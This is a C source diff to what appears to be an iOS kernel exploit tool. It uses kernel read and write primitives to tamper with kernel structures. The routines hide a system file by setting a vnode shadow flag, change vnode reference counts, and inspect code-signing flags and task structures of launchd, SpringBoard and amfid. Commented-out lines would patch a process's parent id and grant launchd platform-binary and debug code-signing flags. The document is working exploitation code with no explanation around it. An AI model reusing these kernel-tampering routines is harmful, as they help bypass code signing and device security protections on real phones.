@@ -276,11 +276,12 @@ bool escapeSandboxForProcess(u64 kfd, uint64_t proc){
 
 int funProc(u64 kfd, uint64_t proc) {
     int p_ppid = kread32(kfd, proc + 0x20);
-    printf("[i] Patching proc->p_ppid to 1: %d\n", p_ppid);
-    kwrite32(kfd, proc + 0x20, 0x1);
-    
-    printf("getppid(): %u\n", getppid());
-    
+    printf("[i] self proc->p_ppid: %d\n", p_ppid);
+//    printf("[i] Patching proc->p_ppid to 1: %d\n", p_ppid);
+//    kwrite32(kfd, proc + 0x20, 0x1);
+//
+//    printf("getppid(): %u\n", getppid());
+//
     int p_original_ppid = kread32(kfd, proc + 0x24);
     printf("[i] self proc->p_original_ppid: %d\n", p_original_ppid);
     
@@ -304,6 +305,17 @@ int funProc(u64 kfd, uint64_t proc) {
     
     int p_svgid = kread32(kfd, proc + 0x40);
     printf("[i] self proc->p_svgid: %d\n", p_svgid);
+    
+    int p_sessionid = kread32(kfd, proc + 0x44);
+    printf("[i] self proc->p_sessionid: %d\n", p_sessionid);
+    
+    uint64_t p_puniqueid = kread64(kfd, proc + 0x48);
+    printf("[i] self proc->p_puniqueid: 0x%llx\n", p_puniqueid);
+    
+//    kwrite64(kfd, proc+0x48, 0x4142434445464748);
+//
+//    p_puniqueid = kread64(kfd, proc + 0x48);
+//    printf("[i] self proc->p_puniqueid: 0x%llx\n", p_puniqueid);
     
     return 0;
 }
@@ -358,29 +370,29 @@ uint64_t funVnode(u64 kfd, uint64_t proc, char* filename) {
     uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
     uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
     uint64_t vnode = vnode_pac | 0xffffff8000000000;
-    printf("vnode: 0x%llx\n", vnode);
+    printf("[i] vnode: 0x%llx\n", vnode);
     
     //vnode_ref, vnode_get
     uint32_t usecount = kread32(kfd, vnode + off_vnode_usecount);
     uint32_t iocount = kread32(kfd, vnode + off_vnode_iocount);
-    printf("usecount: %d, iocount: %d\n", usecount, iocount);
+    printf("[i] vnode->usecount: %d, vnode->iocount: %d\n", usecount, iocount);
     kwrite32(kfd, vnode + off_vnode_usecount, usecount + 1);
     kwrite32(kfd, vnode + off_vnode_iocount, iocount + 1);
     
 #define VISSHADOW 0x008000
     //hide file
     uint32_t v_flags = kread32(kfd, vnode + off_vnode_vflags);
-    printf("v_flags: 0x%x\n", v_flags);
+    printf("[i] vnode->v_flags: 0x%x\n", v_flags);
     kwrite32(kfd, vnode + off_vnode_vflags, (v_flags | VISSHADOW));
 
     //exist test (should not be exist
-    printf("[i] is File exist?: %d\n", access(filename, F_OK));
+    printf("[i] %s access ret: %d\n", filename, access(filename, F_OK));
     
     //show file
     v_flags = kread32(kfd, vnode + off_vnode_vflags);
     kwrite32(kfd, vnode + off_vnode_vflags, (v_flags &= ~VISSHADOW));
     
-    printf("[i] is File exist?: %d\n", access(filename, F_OK));
+    printf("[i] %s access ret: %d\n", filename, access(filename, F_OK));
     
     close(file_index);
     
@@ -392,6 +404,56 @@ uint64_t funVnode(u64 kfd, uint64_t proc, char* filename) {
     if(iocount > 0)
         kwrite32(kfd, vnode + off_vnode_iocount, iocount - 1);
 
+    return 0;
+}
+
+int funCSFlags(u64 kfd, char* process) {
+    uint64_t pid = getPidByName(kfd, process);
+    uint64_t proc = getProc(kfd, pid);
+    
+    uint64_t proc_ro = kread64(kfd, proc + 0x18);
+    uint32_t csflags = kread32(kfd, proc_ro + 0x1C);
+    printf("[i] %s proc->proc_ro->csflags: 0x%x\n", process, csflags);
+    
+#define TF_PLATFORM 0x400
+
+#define CS_GET_TASK_ALLOW    0x0000004    /* has get-task-allow entitlement */
+#define CS_INSTALLER        0x0000008    /* has installer entitlement */
+
+#define    CS_HARD            0x0000100    /* don't load invalid pages */
+#define    CS_KILL            0x0000200    /* kill process if it becomes invalid */
+#define CS_RESTRICT        0x0000800    /* tell dyld to treat restricted */
+
+#define CS_PLATFORM_BINARY    0x4000000    /* this is a platform binary */
+
+#define CS_DEBUGGED         0x10000000  /* process is currently or has previously been debugged and allowed to run with invalid pages */
+    
+//    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_DEBUGGED) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
+//    sleep(3);
+//    kwrite32(kfd, proc_ro + 0x1c, csflags);
+    
+    return 0;
+}
+
+int funTask(u64 kfd, char* process) {
+    uint64_t pid = getPidByName(kfd, process);
+    uint64_t proc = getProc(kfd, pid);
+    printf("[i] %s proc: 0x%llx\n", process, proc);
+    uint64_t proc_ro = kread64(kfd, proc + 0x18);
+    
+    uint64_t pr_proc = kread64(kfd, proc_ro + 0x0);
+    printf("[i] %s proc->proc_ro->pr_proc: 0x%llx\n", process, pr_proc);
+    
+    uint64_t pr_task = kread64(kfd, proc_ro + 0x8);
+    printf("[i] %s proc->proc_ro->pr_task: 0x%llx\n", process, pr_task);
+    
+    //proc_is64bit_data+0x18: LDR             W8, [X8,#0x3D0]
+    uint32_t t_flags = kread32(kfd, pr_task + 0x3D0);
+    printf("[i] %s task->t_flags: 0x%x\n", process, t_flags);
+    
+    uint32_t t_flags_ro = kread64(kfd, proc_ro + 0x78);
+    printf("[i] %s proc->proc_ro->t_flags_ro: 0x%x\n", process, t_flags_ro);
+    
     return 0;
 }
 
@@ -428,6 +490,12 @@ u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
     funRoot(kfd, selfProc);
     funProc(kfd, selfProc);
     funVnode(kfd, selfProc, "/System/Library/Audio/UISounds/photoShutter.caf");
+    funCSFlags(kfd, "launchd");
+    
+    funTask(kfd, "launchd");
+    funTask(kfd, "kfd");
+    funTask(kfd, "SpringBoard");
+    funTask(kfd, "amfid");
     
 //    printf("UID: %d\n", getuid());
     
